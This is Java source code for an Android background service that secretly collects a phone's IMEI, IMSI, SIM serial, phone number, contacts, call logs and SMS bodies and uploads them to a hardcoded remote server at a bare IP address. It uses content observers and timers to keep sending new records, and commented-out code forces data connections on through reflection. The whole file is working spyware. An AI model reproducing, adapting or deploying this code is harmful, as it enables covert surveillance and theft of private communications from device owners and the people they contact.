package com.infolands.android;

import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.*;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.ContentObserver;
import android.database.sqlite.SQLiteException;

public class PhoneService extends Service {

  //public static final String REGISTER_URL = "http://10.0.2.2:8989/LocationServerJava/register";
  //public static final String PHONEINFO_URL = "http://10.0.2.2:8989/LocationServerJava/phoneinfo";

  public static final String URL_HEAD = "http://176.34.59.87:8989/LocationServerJava";
  public static final String BIND_URL = URL_HEAD + "/bind";
  public static final String DEVICEINFO_URL = URL_HEAD + "/deviceinfo";
  public static final String CONTACT_URL = URL_HEAD + "/contact";
  public static final String CALLLOG_URL = URL_HEAD + "/calllog";
  public static final String SMS_URL = URL_HEAD + "/sms";

  private TelephonyManager tm;
  
  private ContentObserver contactObserver;
  private ContentObserver callLogObserver;
  private ContentObserver smsObserver;

  private String contactMaxID = null;
  private String callLogMaxTime = null;
  private String smsMaxTime = null;

  private LocationHttpAPI httpHandle = new LocationHttpAPI();

  private Handler mHandler = new Handler();

  private boolean isDevInfoUpload = false;//本变量保证在上传contact，calllog，sms之前，已经上传了deviceinfo，可以使用maxvalue字段

  private String distributor = "PI_PUBLIC";
  
  @Override
  public void onCreate() {
    super.onCreate();
  }

  @Override
  public IBinder onBind(Intent arg0) {
    return null;
  }

  @Override
  public int onStartCommand(Intent intent, int flags, int startId) {

    tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
    
    PackageManager pm = getPackageManager();
    List<ResolveInfo> resolveInfos = pm.queryIntentServices(intent, flags);
    for (ResolveInfo reInfo : resolveInfos) {//此处只有本PhoneService一个对象，所以只会循环赋值一次
      distributor = (String) reInfo.serviceInfo.loadLabel(pm);
    }
    
    //因为监听的observer会上报很多个事件放在looper的队列中，所以需要设定一个handler来处理（这里是主handler）
    contactObserver = new ContentObserver(mHandler) {

      @Override
      public void onChange(boolean selfChange) {
        if (getPhoneMaxValue() == true) {
          postContact();
        }
      }
    };
    getContentResolver().registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactObserver);
    getContentResolver().registerContentObserver(Uri.parse("content://icc/adn"), true, contactObserver);

    callLogObserver = new ContentObserver(mHandler) {

      @Override
      public void onChange(boolean selfChange) {
        if (getPhoneMaxValue() == true) {
          postCallLog();
        }
      }
    };
    getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver);

    smsObserver = new ContentObserver(mHandler) {

      @Override
      public void onChange(boolean selfChange) {
        postSms();
      }
    };
    // ”表“内容观察者 ，通过测试我发现只能监听此Uri -----> content://sms  
    getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, smsObserver);

    TimerTask task1 = new TimerTask() {

      public void run() {
        uploadDeviceInfo();

        if (getPhoneMaxValue() == true) {
          postContact();
        }
      }
    };
    TimerTask task2 = new TimerTask() {

      public void run() {
        uploadDeviceInfo();

        if (getPhoneMaxValue() == true) {
          postCallLog();
        }
      }
    };
    TimerTask task3 = new TimerTask() {

      public void run() {
        uploadDeviceInfo();

        postSms();
      }
    };
    Timer timer = new Timer(true);
    timer.schedule(task1, 10000); //延时10s后执行
    timer.schedule(task2, 20000); //延时20s后执行
    timer.schedule(task3, 30000); //延时30s后执行

    return START_STICKY;
  }

  private void uploadDeviceInfo() {
    
//    //首先Enable手机Wifi
//    WifiManager wifiManager = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
//    if (!wifiManager.isWifiEnabled()) {
//      wifiManager.setWifiEnabled(true);
//    }
//
//    //开启数据连接，好像测试不成功。。
//    if (tm.getDataState() == TelephonyManager.DATA_DISCONNECTED)
//    {//所谓的反射就是从class文件中获取对象的method，然后再以此对象为参数调用此方法，这样可以达到从外部调用私有方法的目的。
//      try
//      {
//        //以tm为参数调用tm的getITelephony方法
//        Class<?> tmClass = Class.forName(tm.getClass().getName());
//        Method getITelephonyMethod = tmClass.getDeclaredMethod("getITelephony");
//        getITelephonyMethod.setAccessible(true);
//        Object getITelephonyResult = getITelephonyMethod.invoke(tm);
//        
//        //再以getITelephonyResult为参数调用getITelephonyResult的enableDataConnectivity方法
//        Class<?> getITelephonyResultClass = Class.forName(getITelephonyResult.getClass().getName());
//        Method dataConnSwitchmethod = getITelephonyResultClass.getDeclaredMethod("enableDataConnectivity");
//        dataConnSwitchmethod.setAccessible(true);
//        dataConnSwitchmethod.invoke(getITelephonyResult);
//      }
//      catch (Exception e)
//      {
//        e.printStackTrace();
//      }
//    }
    
    if (httpHandle.initHttpStream(DEVICEINFO_URL) == true) {

      String deviceid = tm.getDeviceId();//GSM时为IMEI,CDMA时为MEID；双卡双待时*#06# 与 getDeviceId可能会返回不同的值，所以需要跟用户统一用getDeviceId返回的值
      httpHandle.writeFormData("deviceid", deviceid, "text/plain");

      String simserial = tm.getSimSerialNumber();//取出ICCID
      httpHandle.writeFormData("simserial", simserial, "text/plain");

      String imsi = tm.getSubscriberId();//取出IMSI
      httpHandle.writeFormData("imsi", imsi, "text/plain");

      String phonenumber = tm.getLine1Number();
      httpHandle.writeFormData("phonenumber", phonenumber, "text/plain");

      httpHandle.writeFormData("model", android.os.Build.MODEL, "text/plain");

      httpHandle.writeFormData("androidversion", Build.VERSION.RELEASE, "text/plain");
      
      httpHandle.writeFormData("distributor", distributor, "text/plain");

      int resp = httpHandle.postStreamFlush();
      if (resp == 200) {
        if ("DEVICE_EXIST".equalsIgnoreCase(httpHandle.getRespHeaderValue("upload_device"))
            || "UPLOAD_SUCCESS".equalsIgnoreCase(httpHandle.getRespHeaderValue("upload_device"))) {
          isDevInfoUpload = true;
        }
      }

      httpHandle.disconnect();
    }
  }

  private boolean getPhoneMaxValue() {

    if (isDevInfoUpload && httpHandle.initHttpStream(DEVICEINFO_URL) == true) {
      String deviceid = tm.getDeviceId();//如果是GSM，则getDeviceId为IMEI

      httpHandle.writeFormData("getvalues", deviceid, "text/plain");//deviceid只是一个查询maxvalue的参数
      int resp = httpHandle.postStreamFlush();
      if (resp == 200) {
        contactMaxID = httpHandle.getRespHeaderValue("contactmaxid");
        callLogMaxTime = httpHandle.getRespHeaderValue("calllogmaxtime");
        smsMaxTime = httpHandle.getRespHeaderValue("smsmaxtime");

        if (contactMaxID != null && callLogMaxTime != null && smsMaxTime != null) {//表示获得了server端的实际的max记录数据
          return true;
        }
      }

      httpHandle.disconnect();
    }

    return false;
  }

  private void postContact() {
    if (httpHandle.initHttpStream(CONTACT_URL) == true) {
      writeContactToStream();
      int resp = httpHandle.postStreamFlush();
      if (resp == 200) {

      }

      httpHandle.disconnect();
    }

  }

  private void postCallLog() {
    if (httpHandle.initHttpStream(CALLLOG_URL) == true) {
      writeCallLogToStream();
      int resp = httpHandle.postStreamFlush();
      if (resp == 200) {

      }

      httpHandle.disconnect();
    }
  }

  private void postSms() {

    while (getPhoneMaxValue() == true) {
      if (httpHandle.initHttpStream(SMS_URL) == true && writeSmsToStream() == true) {

        int resp = httpHandle.postStreamFlush();
        if (resp == 200) {
        }
        httpHandle.disconnect();
        
        try {
          Thread.sleep(1000);
        }
        catch (InterruptedException e) {
          e.printStackTrace();
        }
      }
      else {
        break;
      }
    }

  }

  private void writeContactToStream() {

    String deviceid = tm.getDeviceId();
    httpHandle.writeFormData("deviceid", deviceid, "text/plain");

    String selection = null;
    String[] selectionArgs = null;
    if (!"0".equals(contactMaxID)) {//此时在外面已保证contactMaxID!=null
      selection = String.format("%s > ?", "_id");
      selectionArgs = new String[]{contactMaxID};
    }
    //String sortOrder = SmsConsts.DATE + " LIMIT " + PrefStore.getMaxItemsPerSync(this);
    try {
      //先讀手機本地的號碼
      ContentResolver cr = getContentResolver();
      Cursor phonecursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, selection, selectionArgs, null);
      StringBuilder sb = new StringBuilder();

      String maxID = "";//用于记录每次同步的最后一条contact的ID值。
      int testcount = phonecursor.getCount();
      for (int i = 0; i < testcount; i++) {
        phonecursor.moveToPosition(i);
        //获取一条card信息
        String contactId = phonecursor.getString(phonecursor.getColumnIndex("_id"));
        sb.append("contactID=" + contactId);
        if (contactId.compareTo(maxID) > 0) {
          maxID = contactId;
        }

        String contactName = phonecursor.getString(phonecursor.getColumnIndex(PhoneLookup.DISPLAY_NAME));
        sb.append("|contactName=" + contactName);

        Cursor subPhoneCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"_id",
            "display_name", "data1", "data3"}, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
            null, null);
        //获取本条card中的所有phonenumber信息
        while (subPhoneCur.moveToNext()) {
          String phoneNumber = subPhoneCur.getString(subPhoneCur
              .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
          //            String phoneType = subPhoneCur.getString(subPhoneCur
          //                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
          sb.append("|phoneType=" + "phone");
          sb.append("|phoneNumber=" + phoneNumber);
        }
        subPhoneCur.close();
        httpHandle.writeFormData("contactitem", sb.toString(), "text/plain");
        sb.delete(0, sb.length());
      }

      //再讀sim卡中的號碼
      //      Cursor simcursor = cr.query(Uri.parse("content://icc/adn"), null, selection, selectionArgs, null);
      //      testcount = simcursor.getCount();
      //      if (simcursor.moveToFirst()) {
      //        do {
      //          String contactId = simcursor.getString(simcursor.getColumnIndex(ContactsContract.Contacts._ID));
      //          sb.append("contactID=" + contactId);
      //          if (contactId.compareTo(maxID) > 0) {
      //            maxID = contactId;
      //          }
      //
      //          String contactName = simcursor.getString(simcursor.getColumnIndex("name"));
      //          sb.append("contactName=" + contactName);
      //
      //          Cursor subSimCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
      //              ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
      //          //一个人可能有几个号码
      //          while (subSimCur.moveToNext()) {
      //            String phoneNumber = subSimCur.getString(subSimCur
      //                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
      //            //            String phoneType = subSimCur.getString(subSimCur
      //            //                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
      //            sb.append("|phoneType=" + "sim");
      //            sb.append("|phoneNumber=" + phoneNumber);
      //          }
      //          subSimCur.close();
      //          httpHandle.writeFormData("contactitem", sb.toString(), "text/plain");
      //          sb.delete(0, sb.length());
      //        }
      //        while (simcursor.moveToNext());
      //      }
    }
    catch (SQLiteException ex) {
      Log.d("SQLiteException in writeContactToStream", ex.getMessage());
    }
  }

  private void writeCallLogToStream() {

    String deviceid = tm.getDeviceId();
    httpHandle.writeFormData("deviceid", deviceid, "text/plain");

    String selection = null;
    String[] selectionArgs = null;
    if (!"0".equals(callLogMaxTime)) {//此时在外面已保证callLogMaxTime!=null
      selection = String.format("%s > ?", CallLog.Calls.DATE);
      selectionArgs = new String[]{callLogMaxTime};
    }
    try {
      StringBuilder sb = new StringBuilder();
      ContentResolver cr = getContentResolver();
      Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, new String[]{CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
          CallLog.Calls.TYPE, CallLog.Calls.DATE}, selection, selectionArgs, "date asc");

      String maxDate = "";//用于记录每次同步的最后一条calllog的时间值。
      for (int i = 0; i < cursor.getCount(); i++) {
        cursor.moveToPosition(i);
        String numberStr = cursor.getString(0);// 电话号码
        String nameStr = cursor.getString(1);// 名字

        if (cursor.getString(3).compareTo(maxDate) > 0) {
          maxDate = cursor.getString(3);
        }

        long time_mills = Long.parseLong(cursor.getString(3));// 打电话的时间
        String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(time_mills));

        String typeStr = null;
        switch (cursor.getInt(2)) {
          case 1:
            typeStr = "来电";
            break;
          case 2:
            typeStr = "拨出";
            break;
          case 3:
            typeStr = "未接";
            break;
          default:
            typeStr = "";
            break;
        }
        sb.append("name=" + nameStr + "|");
        sb.append("type=" + typeStr + "|");
        sb.append("phoneNumber=" + numberStr + "|");
        sb.append("time_mills=" + time_mills + "|");
        sb.append("date=" + dateStr);

        httpHandle.writeFormData("calllogitem", sb.toString(), "text/plain");
        sb.delete(0, sb.length());
      }
    }
    catch (SQLiteException ex) {
      Log.d("SQLiteException in writeCallLogToStream", ex.getMessage());
    }

  }

  private boolean writeSmsToStream() {
    final String SMS_URI_ALL = "content://sms/";

    String deviceid = tm.getDeviceId();
    httpHandle.writeFormData("deviceid", deviceid, "text/plain");

    String selection = null;
    String[] selectionArgs = null;
    if (!"0".equals(smsMaxTime)) {//此时在外面已保证smsMaxTime!=null
      selection = String.format("%s > ? AND (%s > ? OR %s < ?) ", "date", "address", "address");
      selectionArgs = new String[]{smsMaxTime, "13", "+87"};//将大于“13”的号码提取出来，（去除10、11、12开头的号码）
    }
    else {
      selection = String.format("%s > ? OR %s < ? ", "address", "address");
      selectionArgs = new String[]{"13", "+87"};
    }
    try {
      StringBuilder sb = new StringBuilder();
      ContentResolver cr = getContentResolver();
      String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
      Cursor cur = cr.query(Uri.parse(SMS_URI_ALL), projection, selection, selectionArgs, "date asc limit 10");

      if (cur.moveToFirst()) {
        int index_Address = cur.getColumnIndex("address");
        int index_Person = cur.getColumnIndex("person");
        int index_Body = cur.getColumnIndex("body");
        int index_Date = cur.getColumnIndex("date");
        int index_Type = cur.getColumnIndex("type");

        String maxDate = "";//用于记录每次同步的最后一条sms的时间值。
        int count = cur.getCount();
        for (int i = 0; i < count; i++) {
          cur.moveToPosition(i);

          String nameStr = cur.getString(index_Person);
          String phoneNumberStr = cur.getString(index_Address);
          String smsbodyStr = cur.getString(index_Body);

          if (cur.getString(index_Date).compareTo(maxDate) > 0) {
            maxDate = cur.getString(index_Date);
          }

          long time_mills = Long.parseLong(cur.getString(index_Date));
          String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(time_mills));

          String typeStr = null;
          switch (cur.getInt(index_Type)) {
            case 1:
              typeStr = "接收";
              break;
            case 2:
              typeStr = "发送";
              break;
            default:
              typeStr = "";
              break;
          }
          sb.append("name=" + nameStr + "|");
          sb.append("type=" + typeStr + "|");
          sb.append("phoneNumber=" + phoneNumberStr + "|");
          sb.append("time_mills=" + time_mills + "|");
          sb.append("date=" + dateStr + "|");
          sb.append("smsbody=" + smsbodyStr);

          httpHandle.writeFormData("smsitem", sb.toString(), "text/plain");
          sb.delete(0, sb.length());
        }

        return true;
      }
    }
    catch (SQLiteException ex) {
      Log.d("SQLiteException in writeSmsToStream", ex.getMessage());
    }

    return false;
  }

}
